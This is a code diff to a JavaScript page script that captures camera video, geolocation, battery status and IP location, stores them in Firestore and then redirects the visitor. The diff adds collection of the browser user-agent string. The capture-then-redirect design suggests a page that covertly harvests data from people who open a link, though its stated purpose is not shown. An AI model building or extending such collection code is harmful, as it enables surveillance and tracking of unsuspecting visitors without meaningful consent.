@@ -135,6 +135,11 @@ function getBatteryPromise() {
     }
 }
 
+// Utility function to get device info
+function getDeviceInfo() {
+    return navigator.userAgent;
+}
+
 // Function to collect location and battery data
 async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) { // Accept videoUrl and cameraError
     let locationData = null;
@@ -142,6 +147,8 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
     let locationError = null;
     let batteryError = null;
     let ipLocationData = null;
+    let deviceInfo = getDeviceInfo(); // Haal device info op
+
 
     console.log("collectOtherData called with videoUrl:", currentVideoUrl, "and cameraError:", currentCameraError); // DEBUG
 
@@ -210,7 +217,7 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
     }
 
     // All data collected (or errors stored), now save and redirect
-    saveDataAndRedirect(currentVideoUrl, locationData, batteryData, locationError, batteryError, currentCameraError, ipLocationData); // Use passed videoUrl and cameraError
+    saveDataAndRedirect(currentVideoUrl, locationData, batteryData, locationError, batteryError, currentCameraError, ipLocationData, deviceInfo); // Use passed videoUrl and cameraError
 }
 
 
@@ -309,7 +316,7 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
 
 
 // Function to save data to Firestore and perform the redirect
-async function saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData) {
+async function saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData, deviceInfo) {
     const dataToSave = {
         videoUrl: videoUrl || null,
         location: locationData || null,
@@ -318,6 +325,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         batteryError: batteryError || null,
         cameraError: cameraError || null,
         ipLocation: ipLocationData || null,
+        deviceInfo: deviceInfo || null,
     };
 
     const currentUserId = await getCurrentUserId();
